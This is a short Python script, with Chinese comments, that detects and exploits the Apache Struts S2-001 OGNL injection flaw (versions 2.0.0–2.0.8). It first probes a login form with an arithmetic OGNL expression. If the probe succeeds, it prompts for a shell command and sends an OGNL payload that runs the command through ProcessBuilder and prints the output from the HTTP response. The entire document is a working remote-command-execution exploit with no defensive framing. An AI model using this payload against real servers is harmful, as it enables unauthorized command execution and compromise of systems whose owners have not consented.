import requests
from bs4 import BeautifulSoup

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'}


def s2_001(url):
    # 影响版本：
    # Struts 2.0.0 - Struts 2.0.8
    data = {
        'username': '1213',
        'password': '%{1+12}'
    }

    s = requests.post(url=url, data=data, headers=headers)
    soup = BeautifulSoup(s.text, 'lxml')
    flag = soup.find_all("input")
    flag1 = flag[1]
    if "13" in str(flag1):
        print("存在s2-001漏洞")
        exec1 = input("exec:")
        s2_001exp(geturl, exec1)
    else:
        pass


def s2_001exp(url, exec):
    data = {
        'username': '1212',
        'password': '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"' +
                    exec + '"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'
    }
    s = requests.post(url=url, data=data, headers=headers)
    soup = BeautifulSoup(s.text, 'lxml')
    getexec = soup.find("table")
    print(getexec)


if __name__ == '__main__':
    geturl = input("url:")
    s2_001(geturl)
